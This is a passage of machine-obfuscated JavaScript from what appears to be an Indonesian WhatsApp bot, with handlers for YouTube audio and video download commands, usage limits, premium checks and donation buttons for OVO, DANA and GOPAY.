yts(srch),server='en68',aramat=aramas['all'];var mulaikah=aramat[-0xf68+-0x2232+0x716*0x7][_0x15af3d(0x45a,0x147,0x477,-0x18)];try{ytv2(mulaikah,server)['then'](_0x154529=>{const _0x39de17={'ydSgQ':function(_0x2f0d94,_0x28b48d){return _0x2f0d94>=_0x28b48d;},'ktVVH':function(_0xb88526,_0x282e6f){return _0xb88526(_0x282e6f);},'QShJR':function(_0x16de99,_0x2fe65e,_0x588e26,_0x181cc5){return _0x16de99(_0x2fe65e,_0x588e26,_0x181cc5);}};function _0xbb0ca4(_0x1bd7d6,_0x15b310,_0x5be370,_0xaebe74){return _0x15af3d(_0x15b310- -0x1f5,_0x15b310-0x16c,_0xaebe74,_0xaebe74-0x12b);}function _0x10df50(_0x59ad6c,_0x75ff53,_0x3ac073,_0x3ebe2c){return _0x134458(_0x59ad6c-0x30c,_0x75ff53-0x31,_0x3ac073,_0x3ebe2c-0x191);}const {dl_link:_0x2d49bb,thumb:_0x17dfb6,title:_0x1dfde5,filesizeF:_0x4ff227,filesize:_0x323310}=_0x154529;axios[_0x10df50(0xc56,0xb3a,0xb96,0x10d9)](_0x10df50(0xdc9,0x1122,0xf8d,0x91e)+_0xbb0ca4(0xd20,0x92e,0x9f3,0xb24)+_0xbb0ca4(0xea,0x552,0x131,0x86b)+_0xbb0ca4(0x52c,0x8ec,0x9ea,0x781)+_0x2d49bb)[_0xbb0ca4(0x2ea,0x587,0x513,0x563)](async _0x1c5272=>{if(_0x39de17[_0x2e3de9(-0x18f,0x1c9,0x101,-0x64)](_0x39de17[_0x2e8d37(0x1220,0xd4c,0x1151,0xbe6)](Number,_0x323310),-0x2*-0xa0e4+0x292ff+-0x24e27*0x1))return _0x39de17[_0x2e8d37(0x3ed,0x582,0x23e,0x123)](sendMediaURL,from,_0x17dfb6,_0x2e8d37(0xc93,0xc1e,0xc70,0x1014)+_0x2e3de9(0x105,0x4fd,0x3ac,0x3f9)+enter+enter+('🐣\x20*Title*\x20'+':\x20')+_0x1dfde5+enter+(_0x2e3de9(0x800,0x3b1,0x572,0x169)+'MP3')+enter+(_0x2e8d37(0x8fd,0x95b,0xc8c,0xa9d)+_0x2e3de9(-0x25,0x16f,0x603,0x3a7))+_0x4ff227+enter+(_0x2e8d37(0x8ad,0xa6f,0xc09,0x581)+'\x20')+_0x1c5272['data']+enter+enter+(_0x2e3de9(0x4a5,0x69,0x78,0x6d)+_0x2e8d37(0xe07,0x9f7,0xc8e,0x912)+'dari\x20batas'+'\x20disajikan'+'\x20dalam\x20ben'+_0x2e8d37(0xbb3,0x815,0x32d,0xa01)));function _0x2e8d37(_0x10f0ad,_0x1f9ecc,_0x42edbd,_0x2af12f){return _0x10df50(_0x1f9ecc-0x83,_0x1f9ecc-0x146,_0x2af12f,_0x2af12f-0x136);}const _0x2fdc14=_0x2e8d37(0xcff,0xc1e,0x8bb,0xc96)+'-PLAY\x20MP4*'+enter+enter+('🐣\x20*Title*\x20'+':\x20')+_0x1dfde5+enter+enter+(_0x2e3de9(0x3cb,0x3b1,0x3c2,0x3b6)+_0x2e8d37(0x734,0x7f1,0x6f6,0x510))+enter+(_0x2e8d37(0x724,0x9cc,0x803,0x66d)+'\x20')+_0x4ff227+enter+('🐺\x20*Link*\x20:'+'\x20')+_0x1c5272[_0x2e3de9(-0x1ec,-0x8a,0x34d,-0x573)]+enter+enter+(_0x2e3de9(0x18d,0x49f,-0x51,0x988)+_0x2e8d37(0xac6,0xc06,0x837,0xc7b)+_0x2e8d37(0x46e,0x605,0x6b0,0x50f)+_0x2e3de9(0x400,0x875,0x402,0xa8a)+_0x2e8d37(0x10a1,0xe6d,0xae3,0xd7a)+_0x2e3de9(0x40e,0x52e,0x405,0x259)+_0x2e8d37(0xaad,0xe03,0xf47,0xca9)+'t_');sendMediaURL(from,_0x17dfb6,_0x2fdc14);const _0x189496={};_0x189496[_0x2e3de9(0x406,0x7fb,0x3b2,0x5a9)]='audio/mp4',_0x189496[_0x2e8d37(0xf76,0xac3,0xf61,0x739)]=_0x1dfde5+_0x2e3de9(0x918,0x5cc,0x634,0x319),_0x189496['quoted']=fgclink2,_0x189496[_0x2e8d37(0x1098,0xcf7,0xb1a,0xbe9)+'o']={},_0x189496[_0x2e8d37(0x1098,0xcf7,0xb1a,0xbe9)+'o'][_0x2e3de9(0xb3,0x528,0xc0,0x7ff)+'Score']=0x1fc,_0x189496[_0x2e8d37(0x1098,0xcf7,0xb1a,0xbe9)+'o']['isForwarde'+'d']=!![],_0x189496[_0x2e8d37(0x1098,0xcf7,0xb1a,0xbe9)+'o'][_0x2e8d37(0xd1a,0x910,0xb41,0xbda)+_0x2e8d37(0xa5e,0x6c4,0xa87,0x548)]={};function _0x2e3de9(_0x1e4482,_0x340d37,_0x188c31,_0x1f5794){return _0x10df50(_0x340d37- -0x582,_0x340d37-0x144,_0x188c31,_0x1f5794-0x36);}_0x189496[_0x2e8d37(0x1098,0xcf7,0xb1a,0xbe9)+'o'][_0x2e8d37(0xd1a,0x910,0xb41,0xbda)+_0x2e8d37(0xa5e,0x6c4,0xa87,0x548)][_0x2e8d37(0xd29,0x891,0x642,0x620)]=_0x1dfde5,_0x189496[_0x2e8d37(0x1098,0xcf7,0xb1a,0xbe9)+'o'][_0x2e8d37(0xd1a,0x910,0xb41,0xbda)+_0x2e8d37(0xa5e,0x6c4,0xa87,0x548)]['body']='',_0x189496[_0x2e8d37(0x1098,0xcf7,0xb1a,0xbe9)+'o'][_0x2e8d37(0xd1a,0x910,0xb41,0xbda)+_0x2e8d37(0xa5e,0x6c4,0xa87,0x548)]['mediaType']='2',_0x189496[_0x2e8d37(0x1098,0xcf7,0xb1a,0xbe9)+'o'][_0x2e8d37(0xd1a,0x910,0xb41,0xbda)+_0x2e8d37(0xa5e,0x6c4,0xa87,0x548)]['thumbnail']=pp_userz,_0x189496[_0x2e8d37(0x1098,0xcf7,0xb1a,0xbe9)+'o'][_0x2e8d37(0xd1a,0x910,0xb41,0xbda)+_0x2e8d37(0xa5e,0x6c4,0xa87,0x548)]['mediaUrl']='https://yo'+'utube.com/'+_0x2e3de9(-0x13f,0xd9,-0x39a,-0xbc)+'c',await _0x39de17[_0x2e3de9(0x4,-0x83,-0x54f,0x132)](sendFileFromUrlF,_0x2d49bb,document,_0x189496)[_0x2e3de9(0x947,0x489,0x554,0x949)](()=>reply(_0x2e3de9(-0x10,-0xbb,0x1bb,-0xd9)));});});}catch(_0x408038){reply(mess[_0x15af3d(0x79d,0x329,0xc00,0xb78)][_0x134458(0x606,0x406,0x779,0x968)]);}}await limitAdd(sender,limit);break;case'ytmp3':const _0x3948e7={};_0x3948e7[_0x15af3d(0x6ec,0x383,0x46d,0x8f1)+'t']=_0x134458(0x806,0xb5e,0x4c0,0x933)+'t';const _0x12e74b={};_0x12e74b[_0x15af3d(0xc33,0x953,0xbfc,0xb17)]=_0x134458(0x7fd,0x80e,0x905,0x5f4),_0x12e74b['buttonText']=_0x3948e7,_0x12e74b[_0x134458(0x8ff,0x521,0x815,0x8f3)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang['limit'](prefix),'©\x20'+ownername,[_0x12e74b]);if(args[_0x15af3d(0x8be,0x912,0x49d,0x902)]===-0x1*-0x164+-0x85d*-0x3+-0x1a7b)return reply(_0x134458(0x924,0xcc0,0xa9d,0x6d9)+'ntah\x20*'+prefix+(_0x134458(0x9aa,0xd8c,0x638,0x834)+'kYt]*'));let isLinks=args[-0x8f5*0x3+-0x3*0x8b3+-0xa98*-0x5][_0x15af3d(0x976,0x68b,0xbbf,0x983)](/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/);if(!isLinks)return reply(mess[_0x134458(0x64a,0x410,0x2f6,0x6d6)]['Iv']);try{reply(lang['wait']());let yut=await yts(args[-0x13ed*0x1+-0x10*-0x12b+0x13d]);yta(args[-0x247+0x7ea+-0x5a3])[_0x15af3d(0x77c,0xc3f,0x68c,0x62c)](_0x2993de=>{const _0x5c1974={'RZVer':'bayar_ovo1'+'8','CGmnZ':_0x36a935(0x7a,0x2dd,0x440,0x60c),'wUKfv':_0x36a935(0xc71,0xabe,0x605,0xc6a)+'18','tJEPt':_0x36a935(0x6b8,0x5ee,0xa61,0xa92),'hwpim':'bayar_gopa'+_0x36a935(0xdbc,0xa22,0x8b0,0xba3),'LIcqN':_0x2d81e1(0xaf1,0x611,0x6a6,0x741)+'21','RpxAH':function(_0x43ac0b,_0x3cac9c){return _0x43ac0b===_0x3cac9c;},'eRYYg':'gYlhk','pbVYd':function(_0x49c6d7,_0xc079e4){return _0x49c6d7(_0xc079e4);},'MgpSu':function(_0x368588,_0x176e60,_0x5dcbc8,_0x3d5c48){return _0x368588(_0x176e60,_0x5dcbc8,_0x3d5c48);},'klSmm':'MP3','qwAmQ':'RESPONSE','DkYRT':_0x2d81e1(0x2d1,0x5d8,0x49c,0x5dd),'pjRzr':function(_0x502289,_0x4c51ca,_0x110eec,_0x24e219,_0x39394d,_0x348176,_0x3059b6){return _0x502289(_0x4c51ca,_0x110eec,_0x24e219,_0x39394d,_0x348176,_0x3059b6);}};function _0x2d81e1(_0x4f991a,_0x2bfdaf,_0x4c966d,_0x2e8ad8){return _0x134458(_0x4c966d-0x1bc,_0x2bfdaf-0xb5,_0x2bfdaf,_0x2e8ad8-0x14b);}function _0x36a935(_0x205dbd,_0xbeaefc,_0x449253,_0x433c5b){return _0x15af3d(_0xbeaefc- -0x199,_0xbeaefc-0x198,_0x449253,_0x433c5b-0x2c);}const {dl_link:_0x3cfd79,thumb:_0x2d0d4f,title:_0x168f86,filesizeF:_0xdb4fe2,filesize:_0x13f203}=_0x2993de;axios['get'](_0x36a935(0xeb3,0xa77,0xa61,0x6cd)+_0x36a935(0xcb5,0x98a,0x77e,0x73b)+_0x2d81e1(0x61c,0x407,0x7b0,0xa9a)+_0x2d81e1(0xe9d,0xe11,0xb4a,0x72f)+_0x3cfd79)['then'](async _0x2c0236=>{function _0x53e1a5(_0x24b7bc,_0x51ef0d,_0x2092ed,_0x3a0d9f){return _0x2d81e1(_0x24b7bc-0xb8,_0x3a0d9f,_0x2092ed- -0x458,_0x3a0d9f-0x1ce);}function _0x349e19(_0x278bfe,_0x7aef1d,_0x3846ea,_0x278179){return _0x36a935(_0x278bfe-0xb7,_0x278179- -0xfe,_0x278bfe,_0x278179-0x181);}if(_0x5c1974['RpxAH'](_0x349e19(0x13a,0x3b1,0xa6,0x49e),_0x5c1974[_0x53e1a5(0x5ef,0x48c,0x47d,0x4cc)])){if(_0x5c1974[_0x53e1a5(0xb34,0x979,0x79c,0x9ad)](Number,_0x13f203)>=0x1511*0x2+-0x2a*0x1d+0x4fd0)return _0x5c1974[_0x53e1a5(0x484,-0xa8,0x215,0x53)](sendMediaURL,from,_0x2d0d4f,'*Data\x20Berh'+_0x349e19(0x821,0x963,0x7f8,0x851)+_0x349e19(-0x216,-0x417,-0x110,0xc)+enter+enter+_0x349e19(0x19b,-0x13e,-0x318,0xc4)+_0x168f86+enter+(_0x349e19(0x4fe,0x477,0x5ca,0x4d0)+'3')+enter+(_0x349e19(0x39d,0x46e,0x367,0x758)+'\x20:\x20')+_0xdb4fe2+enter+_0x349e19(-0x4bc,0x2f1,-0x16f,0x1b)+_0x2c0236['data']+enter+enter+(_0x349e19(-0x87,0xaf,0x472,0x19b)+_0x53e1a5(0x57e,0x8b8,0x3cc,0x4e1)+'dari\x20batas'+_0x53e1a5(0x5b5,0x4e3,0x322,0x5bf)+_0x53e1a5(0x242,0x6fa,0x5fb,0x9ef)+'tuk\x20link_'));const _0x3fa069='*🎶\x20YOUTUBE'+_0x349e19(0x39,0x1b6,0x367,0x82)+'\x0a\x0a💦\x20Title\x20'+':\x20'+_0x168f86+(_0x349e19(0xb08,0x4ce,0x5e1,0x6ed)+_0x349e19(0x40c,0x2ed,0x23d,0x632))+yut['videos'][0x1743+0x2*0x11b+-0x1979][_0x53e1a5(0x4ca,0x2fb,0x43d,-0xa)]+(_0x53e1a5(0x1dd,0x3a9,0x1c8,-0x212)+':\x20')+yut[_0x53e1a5(0x758,0x8cc,0x43a,0x72c)][0x6*-0x4c1+0x1e7*0x1+0x1*0x1a9f][_0x349e19(0xa0e,0x5e8,0xbe9,0x6ff)]+('\x20\x0a🎃\x20Size\x20:'+'\x20')+_0x13f203+(_0x53e1a5(0x81,0x397,-0x35,0x247)+_0x53e1a5(0x2e1,0x1b2,0x26f,-0x14c))+yut[_0x53e1a5(0x51a,0x2c8,0x43a,0x137)][-0x1c4b+0x21d0*0x1+-0x3*0x1d7]['views']+(_0x53e1a5(-0x15f,0x3bf,0x291,0x6b0)+_0x349e19(-0x62,-0x158,0x2ba,0x1e3))+yut[_0x349e19(0x1c1,0x7ed,0x3e1,0x592)][0x27e*-0xc+-0x1b8f+0x3977][_0x53e1a5(0x4f,-0x119,0x2ce,0x98)]+_0x53e1a5(0x8e9,0x7fb,0x809,0xad3)+yut['videos'][0x193a+-0x1c43+-0x7*-0x6f][_0x349e19(0x99,0x632,0x631,0x1c3)];let _0x3f0c7a=await _0x5c1974['pbVYd'](getBuffer,_0x2d0d4f);const _0x183159={};_0x183159['displayTex'+'t']=_0x5c1974['klSmm'];const _0x459d4a={};_0x459d4a[_0x53e1a5(0x4f9,0xaa7,0x844,0x46a)]=_0x349e19(0x2c0,-0x4c,0x275,0x1eb)+q,_0x459d4a[_0x53e1a5(0x213,0x16b,0x1b8,0x10b)]=_0x183159,_0x459d4a[_0x53e1a5(0x8f6,0x626,0x663,0x248)]=_0x5c1974[_0x53e1a5(0x899,0x81b,0x421,0x211)];const _0x5a7ea7={};_0x5a7ea7['displayTex'+'t']=_0x5c1974[_0x53e1a5(0x22,-0x105,0x1d,-0x48e)];const _0x413529={};_0x413529[_0x349e19(0x8f5,0x97f,0xb39,0x99c)]=_0x349e19(-0x163,0x4cd,0x3f9,0xa0)+q,_0x413529['buttonText']=_0x5a7ea7,_0x413529[_0x349e19(0x452,0xc49,0x579,0x7bb)]=_0x5c1974[_0x349e19(0x438,0x996,0x337,0x579)];let _0x49ed04=[_0x459d4a,_0x413529];_0x5c1974['pjRzr'](sendButLocation,from,_0x3fa069,_0x349e19(0x2bd,0x684,0x227,0x52c)+enter+('Jika\x20whats'+_0x349e19(0x6e8,0xaa8,0xa8f,0x935)+_0x349e19(0x463,0x2d,0x370,0x2fd)+'upport\x20but'+'ton\x20silahk'+_0x53e1a5(0x280,0x866,0x662,0x574)+_0x53e1a5(-0x47,-0x56f,-0x8a,-0x19c)+_0x53e1a5(0xc1b,0x92e,0x850,0x640)+_0x349e19(-0x3f3,0x5c,0xce,0x83)+'ID4Fmo9w')+enter+enter+botname+'™©\x20|\x20By\x20'+ownername,_0x3f0c7a,_0x49ed04,{});}else{var _0x52a806=_0x349e19(0x60e,0x598,0x8f,0x2d6)+_0x158d24[_0x349e19(0x75e,0x55,-0x79,0x2a8)]('@')[-0x1*-0xda5+-0x841*-0x2+-0x1e27]+(_0x349e19(0x32c,0x687,0x690,0x53c)+_0x53e1a5(-0x1c7,0x2b,0x228,0x592)+'a\x20apa\x20nih?'+'\x20OVO,\x20DANA'+_0x53e1a5(0x441,-0x7,0x3ca,0x83e)+'PAY.\x20Untuk'+'\x20donasi\x20vi'+'a\x20pulsa\x20bi'+_0x349e19(0x144,0x277,0x375,0x339)+_0x53e1a5(0x143,-0x2bb,0x5a,-0x403)+'langsung😇');const _0x43e5f0={};_0x43e5f0[_0x349e19(0xdfa,0xb69,0xc47,0x99c)]=_0x5c1974['RZVer'],_0x43e5f0[_0x349e19(0x3e5,0x493,0x475,0x310)]={},_0x43e5f0[_0x349e19(0xa76,0xbfe,0x8d0,0x7bb)]=0x1,_0x43e5f0[_0x349e19(0x3e5,0x493,0x475,0x310)]['displayTex'+'t']=_0x5c1974[_0x53e1a5(-0x2c4,0x29e,-0xb9,0x149)];const _0x24d9d8={};_0x24d9d8['buttonId']=_0x5c1974['wUKfv'],_0x24d9d8[_0x53e1a5(-0x1f7,-0x26,0x1b8,-0x2e3)]={},_0x24d9d8[_0x53e1a5(0x553,0x8f0,0x663,0x787)]=0x1,_0x24d9d8[_0x53e1a5(-0x1f7,-0x26,0x1b8,-0x2e3)]['displayTex'+'t']=_0x5c1974[_0x53e1a5(0x6ed,0x33f,0x2ac,0x17e)];const _0x33f942={};_0x33f942[_0x349e19(0x4c2,-0x82,0x8af,0x455)+'t']='GOPAY';const _0x3a5202={};_0x3a5202[_0x53e1a5(0xbf0,0xcf2,0x844,0x4a8)]=_0x5c1974[_0x53e1a5(0x209,-0x1e7,-0x2b,0x170)],_0x3a5202['buttonText']=_0x33f942,_0x3a5202[_0x349e19(0x31f,0x3fa,0x480,0x7bb)]=0x1;const _0x2bd488=[_0x43e5f0,_0x24d9d8,_0x3a5202],_0x14636e={};_0x14636e[_0x349e19(0x644,0x1e9,0xb4b,0x6b3)+'t']=_0x52a806,_0x14636e[_0x349e19(0x791,0x9a2,0xce4,0x86e)]=''+_0x3a716b+_0xbc314d+_0x4c625f+_0x18cbd6+_0x2fa87f+'©\x20'+_0xbf6f40,_0x14636e[_0x349e19(-0xe2,0x54,-0x14d,0x1dd)]=_0x2bd488,_0x14636e[_0x349e19(0x144,0x195,0x497,0x2f8)]=0x1;const _0x3ddb58=_0x14636e,_0x347e28={};_0x347e28[_0x53e1a5(0x65a,0xa47,0x77f,0x8cd)]='hi',_0x347e28[_0x53e1a5(0x650,0x9c6,0x502,0x21f)+_0x53e1a5(0x914,0x787,0x815,0x64f)]=0x3b9aca00,_0x347e28[_0x53e1a5(-0x26a,-0x109,0x199,0x6f)+'d']=!![],_0x347e28[_0x349e19(0x396,-0xb3,0x173,0x393)+_0x349e19(-0xb9,-0xb9,-0x1b9,0x333)]=!![],_0x347e28[_0x349e19(-0x125,-0x14e,0x3e7,0x2bf)+'id']=[_0x36cf08];const _0x170a93={};_0x170a93[_0x53e1a5(0x1fc,0x1ac,0x151,-0x23a)]=_0x5c1974[_0x53e1a5(0xb47,0x81f,0x69c,0x24a)],_0x170a93[_0x349e19(0xbf2,0xabd,0xbab,0x824)+'o']=_0x347e28,_0x170a93['quoted']=_0x32775c,_0x170a93[_0x53e1a5(0x6d0,0x4d5,0x23b,0x1e5)+_0x53e1a5(0x58d,-0x3d,0x1db,0x69d)]=!![],_0x5ed1d9['sendMessag'+'e'](_0x6f908e,_0x3ddb58,_0x42e842[_0x349e19(0x14c,-0x4dd,-0x37,0xd)+_0x53e1a5(0xbae,0x6e9,0x707,0x964)],_0x170a93);}});});}catch(_0x599954){reply(mess[_0x134458(0x64a,0x6c0,0x444,0x716)][_0x15af3d(0x759,0xbde,0x350,0x57a)]);}await limitAdd(sender,limit);break;case _0x15af3d(0x905,0x74f,0x805,0xa5d):{const _0x164577={};_0x164577['displayTex'+'t']='Check\x20Limi'+'t';const _0x32a444={};_0x32a444[_0x134458(0xae0,0x870,0x623,0x64c)]=_0x134458(0x7fd,0x35a,0x8af,0x882),_0x32a444[_0x134458(0x454,0x7a9,0x21b,0x18c)]=_0x164577,_0x32a444[_0x134458(0x8ff,0x9bc,0xcb8,0x5ad)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0xc7c,0x8ff,0xab0)](prefix),'©\x20'+ownername,[_0x32a444]);if(args['length']===0x2*0x109f+-0x15d4+-0x3ce*0x3)return reply('Kirim\x20peri'+_0x15af3d(0x6b4,0x329,0xa81,0x44d)+prefix+(_0x134458(0x875,0x38f,0x6c6,0x539)+_0x15af3d(0xa32,0xb83,0x5dc,0x826)+_0x15af3d(0xa00,0xb0b,0x60c,0x6ea)+_0x15af3d(0x4d6,0x523,0x379,0x858)));var srch=args[_0x15af3d(0x309,0x598,0x2ad,-0xac)]('');aramas=await yts(srch),server='en68',aramat=aramas[_0x15af3d(0xa17,0x55d,0xce8,0xd1b)];var mulaikah=aramat[0x2*-0xedf+-0xd05+0x2ac3]['url'];try{ytv2(srch,server)['then'](_0x22daa7=>{function _0x5e870f(_0x3b3cea,_0x21436d,_0x24eacf,_0x3e8a90){return _0x15af3d(_0x24eacf- -0x4dc,_0x21436d-0x1c7,_0x21436d,_0x3e8a90-0x48);}const _0x4b4f55={'hrFsb':function(_0x50eb37,_0x4d9c8c){return _0x50eb37>=_0x4d9c8c;},'CLFBB':function(_0x1848f6,_0x5853e5,_0x5bd9a3,_0x3e7f77){return _0x1848f6(_0x5853e5,_0x5bd9a3,_0x3e7f77);},'eWfNG':function(_0x65f783,_0xa2a7b0,_0xd91124,_0x4ff961){return _0x65f783(_0xa2a7b0,_0xd91124,_0x4ff961);}};function _0x9da15a(_0x2aeec8,_0x1752db,_0x3b4968,_0x56d9aa){return _0x134458(_0x3b4968- -0x55,_0x1752db-0x4,_0x56d9aa,_0x56d9aa-0x12);}const {dl_link:_0xafa949,thumb:_0x172198,title:_0x150afa,filesizeF:_0x5a8237,filesize:_0x461eaa}=_0x22daa7;axios['get'](_0x9da15a(0xa15,0xdc8,0xa68,0xa7d)+_0x9da15a(0x5a3,0xcbb,0x97b,0xc8e)+_0x5e870f(0x61b,-0x25a,0x26b,-0x183)+'.php?url='+_0xafa949)['then'](async _0x4a85fa=>{if(_0x4b4f55[_0xfa8e8(-0x1ac,0x19f,0x3cb,0x340)](Number(_0x461eaa),-0x2dcd5+0x26eb+0x43c8a))return _0x4b4f55[_0x16a543(0x9e4,0x935,0x698,0xca1)](sendMediaURL,from,_0x172198,_0xfa8e8(0xa4c,0x65a,0x2c5,0x3d8)+_0xfa8e8(0x3a1,0x53e,0x5d9,0x625)+enter+enter+(_0x16a543(0x832,0xb66,0x73d,0x6a7)+':\x20')+_0x150afa+enter+(_0x16a543(0x59d,0x40c,0x625,0x80e)+_0xfa8e8(0xad2,0x86d,0x65b,0x43b)+'s')+enter+(_0xfa8e8(0x2c5,0x3f2,0xeb,0x880)+_0xfa8e8(0x654,0x855,0x9c3,0xa1f))+enter+(_0x16a543(0x74d,0x3db,0x2fe,0xa9e)+_0x16a543(0x566,0xa51,0x7ee,0x29f))+_0x5a8237+enter+(_0xfa8e8(0x671,0x84e,0x513,0xb1b)+'\x20')+_0x4a85fa[_0x16a543(0x36d,0x38e,0x5b0,0x655)]+enter+enter+(_0xfa8e8(-0x1d4,0xaa,-0x2db,-0x346)+'asi\x20lebih\x20'+_0x16a543(0x8b1,0x96e,0x44c,0x9a2)+_0x16a543(0x73f,0x544,0x4b9,0x2c5)+_0xfa8e8(0x89d,0x662,0xa65,0x411)+_0xfa8e8(-0x1b,0x251,0x467,0x65b)));function _0xfa8e8(_0x28cc62,_0x334aca,_0x403761,_0xcc690){return _0x9da15a(_0x28cc62-0x1d2,_0x334aca-0x23,_0x334aca- -0x1e0,_0x28cc62);}function _0x16a543(_0x1a30d0,_0x368aed,_0x4ba31d,_0x122767){return _0x9da15a(_0x1a30d0-0x1a2,_0x368aed-0xab,_0x1a30d0-0x1d6,_0x368aed);}_0x4b4f55['eWfNG'](sendMediaURL,from,_0xafa949,'')[_0xfa8e8(0x5c9,0x4ca,0x9bf,0x25d)](_0xbb0279=>{function _0x5cba44(_0x2c928c,_0x4e4d30,_0x412beb,_0x546fba){return _0xfa8e8(_0x2c928c,_0x4e4d30-0x261,_0x412beb-0x89,_0x546fba-0xf7);}reply(_0x5cba44(0x26a,0x1e7,0x41f,-0x36));});});});}catch(_0x385f58){reply(mess[_0x15af3d(0x79d,0x88a,0xb3f,0x8d0)][_0x15af3d(0x759,0xae5,0x34b,0x3aa)]);}}await limitAdd(sender,limit);break;case'ytmp4ajahd':{const _0x4f96b3={};_0x4f96b3[_0x15af3d(0x6ec,0x242,0x38f,0xabe)+'t']='Check\x20Limi'+'t';const _0x13b274={};_0x13b274[_0x134458(0xae0,0xe96,0xada,0x80d)]=_0x134458(0x7fd,0xae3,0x5f5,0xca8),_0x13b274[_0x15af3d(0x5a7,0xa9a,0x324,0x100)]=_0x4f96b3,_0x13b274['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0x96f,0xb01,0x671)](prefix),'©\x20'+ownername,[_0x13b274]);const _0x314010={};_0x314010[_0x15af3d(0x6ec,0x2c9,0x761,0x217)+'t']=_0x15af3d(0x5b1,0x3e8,0xa86,0x2a1)+_0x15af3d(0xbaf,0x811,0xdba,0xfbe);const _0x34a910={};_0x34a910[_0x134458(0xae0,0xe7d,0x680,0xd5b)]='goprem',_0x34a910['buttonText']=_0x314010,_0x34a910['type']=0x1;const _0x5154b8={};_0x5154b8[_0x15af3d(0xc2e,0xd3f,0xbe6,0xce4)]=mek;if(!isPremium)return sendButMessage(from,'Mohon\x20maaf'+_0x15af3d(0x73f,0xacf,0x2da,0x937)+_0x134458(0x3b8,0x357,-0x74,0x833)+_0x15af3d(0x520,0x93e,0x2d5,0x118)+_0x15af3d(0x33e,0x565,0x499,0x166)+_0x15af3d(0xc68,0xb2c,0x890,0x853)+_0x134458(0x6b0,0x34d,0x424,0x5bc)+_0x134458(0x231,0x34a,-0xd7,0x4c7)+_0x15af3d(0xa2c,0xc6b,0x641,0xc47)+_0x134458(0x6a1,0x888,0x26a,0xb3e)+prefix+_0x15af3d(0x7af,0x3c7,0xb0f,0xa6e),_0x134458(0x2c6,-0x74,-0xd2,0x4b2)+'on\x20below',[_0x34a910],_0x5154b8);if(args[_0x134458(0x76b,0x4d6,0x4f5,0x690)]===0x179b+-0x10ee+0x6ad*-0x1)return reply(_0x134458(0x924,0x934,0x7fd,0xb40)+_0x15af3d(0x6b4,0x9c9,0xa0e,0x786)+prefix+(_0x15af3d(0x9c8,0xc22,0x840,0x71f)+'dul\x20video\x20'+_0x134458(0x8ad,0x8a4,0xae0,0x4db)+_0x134458(0x383,-0x26,0xf6,-0x5f)));var srch=args[_0x15af3d(0x309,0x6e6,0x5b,-0xb8)]('');aramas=await yts(srch),server=_0x134458(0x45f,0x464,0x24d,0x41),aramat=aramas[_0x134458(0x8c4,0xc4f,0xadb,0xcd4)];var mulaikah=aramat[0x4*-0x3d7+0x1fcf+-0x1073*0x1][_0x15af3d(0x45a,0x362,0x2e8,0x92b)];try{ytv3(srch,server)['then'](_0x4d3200=>{function _0x58193f(_0x10926,_0x552235,_0x2a5bef,_0x4abf42){return _0x134458(_0x4abf42- -0x2b8,_0x552235-0x14e,_0x2a5bef,_0x4abf42-0x1c1);}function _0x15e198(_0x5ba4f6,_0x276abc,_0x9a791f,_0x16bb3e){return _0x15af3d(_0x16bb3e- -0xc3,_0x276abc-0x6e,_0x276abc,_0x16bb3e-0x39);}const _0x1d3df2={'noqZV':function(_0x3b485c,_0x5afde2){return _0x3b485c(_0x5afde2);},'qojSj':'Emror','fGdjX':function(_0x1edb2d,_0x3c3e10){return _0x1edb2d>=_0x3c3e10;},'bQsAg':function(_0x1724fe,_0x90172f){return _0x1724fe(_0x90172f);},'hbdIV':function(_0x35ae20,_0xcbe6,_0x3ef74e,_0x57f41b){return _0x35ae20(_0xcbe6,_0x3ef74e,_0x57f41b);}},{dl_link:_0x404436,thumb:_0x3d7e47,title:_0x17b7a8,filesizeF:_0x2e83ee,filesize:_0x16f349}=_0x4d3200;axios[_0x58193f(0x314,0x644,0x82c,0x692)](_0x58193f(0xabd,0x669,0x981,0x805)+_0x58193f(0x94e,0x645,0xb15,0x718)+'api-create'+'.php?url='+_0x404436)[_0x15e198(0x8bb,0x4c1,0xa11,0x6b9)](async _0x272321=>{function _0x34c355(_0x4b085d,_0x41d21f,_0x247d5e,_0x6aa77e){return _0x58193f(_0x4b085d-0x6e,_0x41d21f-0xe4,_0x6aa77e,_0x247d5e-0x4cf);}if(_0x1d3df2[_0x34c355(0x4c5,0x3c0,0x3d9,0x789)](_0x1d3df2[_0x34c355(0x888,0xadc,0x65b,0x415)](Number,_0x16f349),-0x205cf+-0xc2cf*-0x1+-0x20*-0x164d))return sendMediaURL(from,_0x3d7e47,_0x34c355(0xdab,0xe4d,0xaa6,0xe6f)+_0x34c355(0x732,0xda6,0x98a,0x8c0)+'*'+enter+enter+('🐣\x20*Title*\x20'+':\x20')+_0x17b7a8+enter+(_0x59a7b0(0x15b,0x601,0x3d7,0x491)+_0x59a7b0(0x1e4,0x592,0x818,0x960)+'s')+enter+('🦁\x20*Ext*\x20:\x20'+_0x34c355(0xe5d,0xb88,0xca1,0x804))+enter+(_0x59a7b0(0x6e9,0x7b1,0x4c2,0x3c1)+_0x59a7b0(0x540,0x5ca,0x465,0x89e))+_0x2e83ee+enter+(_0x34c355(0xef9,0xeb6,0xc9a,0xb3c)+'\x20')+_0x272321[_0x34c355(0x541,0x4f8,0x403,-0x20)]+enter+enter+('_Untuk\x20dur'+_0x59a7b0(0xb6d,0x84d,0x5a5,0xc12)+_0x59a7b0(0x85b,0x915,0x918,0x547)+'\x20disajikan'+_0x59a7b0(0x84c,0xa7c,0x944,0xecf)+'tuk\x20link_'));function _0x59a7b0(_0x1edd16,_0x4672a0,_0x4ee23f,_0x80a51f){return _0x58193f(_0x1edd16-0x63,_0x4672a0-0x17,_0x80a51f,_0x4672a0-0x49d);}_0x1d3df2[_0x34c355(0xa25,0xb8f,0x9ca,0xcae)](sendMediaURL,from,_0x404436,'')['catch'](_0x1c8219=>{function _0x1b7caf(_0x18f684,_0x180699,_0x1caf2f,_0x88d241){return _0x59a7b0(_0x18f684-0x71,_0x18f684- -0x548,_0x1caf2f-0x78,_0x88d241);}function _0x1faa01(_0x352ea6,_0x11974b,_0x3abd49,_0x40cc21){return 